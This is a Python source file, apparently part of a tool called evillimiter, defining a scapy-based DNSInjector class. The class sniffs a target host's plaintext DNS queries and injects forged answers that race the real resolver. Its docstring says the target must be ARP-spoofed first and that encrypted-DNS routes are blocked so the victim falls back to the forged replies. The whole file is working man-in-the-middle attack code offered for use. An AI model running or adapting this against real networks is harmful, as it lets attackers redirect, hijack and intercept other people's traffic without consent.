import threading

from scapy.all import sniff, sendp, get_if_hwaddr, Ether, IP, UDP, DNS, DNSQR, DNSRR  # pylint: disable=no-name-in-module

from evillimiter.console.io import IO


class DNSInjector(object):
    """
    Redirects a target host's DNS by sniffing its plaintext (port 53) queries
    and injecting forged answers that race the real resolver.

    This is the macOS-reliable redirection path: it uses libpcap/BPF (the same
    mechanism the ARP spoofer already uses) and never relies on pf rdr delivering
    forwarded traffic to a local socket, which macOS does not do. The target must
    be ARP-spoofed so its DNS flows through us; pair with --harden to block its
    encrypted-DNS escape routes so it falls back to the plain DNS we forge.

    Answer policy per query, in order:
      - domain on the deny list  -> NXDOMAIN   (used for DoH/Private-Relay canaries)
      - domain with a mapping    -> that IP for A; empty NOERROR for AAAA (forces IPv4)
      - catch-all set            -> the catch-all IP for A; empty for AAAA
      - otherwise                -> ignored, the real resolver answers
    """

    def __init__(self, interface):
        self.interface = interface
        self._mappings = {}       # domain -> IPv4 answer
        self._deny = set()        # domains answered with NXDOMAIN
        self._allow = set()       # domains never touched (resolve for real)
        self._catch_all = None    # if set, every A query is answered with this IP
        self._targets = {}        # target source IP -> MAC
        self._lock = threading.Lock()
        self._running = False
        self._thread = None
        try:
            self.our_mac = get_if_hwaddr(interface)
        except Exception:
            self.our_mac = None

    # --- configuration ---------------------------------------------------
    @staticmethod
    def _norm(domain):
        return domain.lower().rstrip('.')

    def set_mapping(self, domain, ip):
        with self._lock:
            self._mappings[self._norm(domain)] = ip

    def add_deny(self, domain):
        with self._lock:
            self._deny.add(self._norm(domain))

    def add_allow(self, domain):
        with self._lock:
            self._allow.add(self._norm(domain))

    def set_catch_all(self, ip):
        with self._lock:
            self._catch_all = ip

    def clear_catch_all(self):
        with self._lock:
            self._catch_all = None

    def add_target(self, host):
        with self._lock:
            self._targets[host.ip] = host.mac

    def remove_target(self, host):
        with self._lock:
            self._targets.pop(host.ip, None)

    # --- lifecycle -------------------------------------------------------
    def start(self):
        if self._running:
            return
        self._running = True
        self._thread = threading.Thread(target=self._run, args=[], daemon=True)
        self._thread.start()

    def stop(self):
        self._running = False

    def _run(self):
        try:
            sniff(iface=self.interface, filter='udp port 53', store=False,
                  prn=self._handle, stop_filter=lambda _p: not self._running)
        except Exception as e:
            IO.error('DNS injector stopped: {}'.format(e))

    # --- packet handling -------------------------------------------------
    def _handle(self, pkt):
        try:
            if not (pkt.haslayer(DNS) and pkt.haslayer(IP) and pkt.haslayer(UDP)):
                return
            dns = pkt[DNS]
            if dns.qr != 0 or dns.qd is None:
                return  # only act on queries

            src_ip = pkt[IP].src
            with self._lock:
                if src_ip not in self._targets:
                    return
                src_mac = self._targets.get(src_ip)
                mappings = dict(self._mappings)
                deny = set(self._deny)
                allow = set(self._allow)
                catch_all = self._catch_all

            qname = self._norm(dns.qd.qname.decode(errors='ignore'))
            qtype = dns.qd.qtype   # 1 = A, 28 = AAAA

            if qname in deny:
                answer = ('nx', None)
            elif qname in mappings:
                answer = ('a', mappings[qname]) if qtype == 1 else ('empty', None)
            elif qname in allow:
                return  # leave OS connectivity-check domains to resolve for real
            elif catch_all is not None:
                answer = ('a', catch_all) if qtype == 1 else ('empty', None)
            else:
                return  # not ours; let the real resolver reply

            self._inject(pkt, src_mac, qname, answer)
        except Exception:
            pass

    def _inject(self, qpkt, src_mac, qname, answer):
        kind, ip = answer
        ipl, udpl, dns = qpkt[IP], qpkt[UDP], qpkt[DNS]

        resp = DNS(id=dns.id, qr=1, aa=1, rd=dns.rd, ra=1, qd=dns.qd)
        if kind == 'nx':
            resp.rcode = 3                       # NXDOMAIN
        elif kind == 'empty':
            resp.rcode = 0                       # NOERROR, no records -> fall back to A
        else:  # 'a'
            resp.an = DNSRR(rrname=dns.qd.qname, type='A', rclass='IN', ttl=60, rdata=ip)

        eth_dst = src_mac or (qpkt[Ether].src if qpkt.haslayer(Ether) else None)
        frame = (Ether(src=self.our_mac, dst=eth_dst) /
                 IP(src=ipl.dst, dst=ipl.src) /
                 UDP(sport=udpl.dport, dport=udpl.sport) /
                 resp)
        try:
            sendp(frame, iface=self.interface, verbose=0)
            print('DEBUG: DNS inject {} {} -> {}'.format(qname, kind, ip if ip else '-'))
        except Exception:
            pass
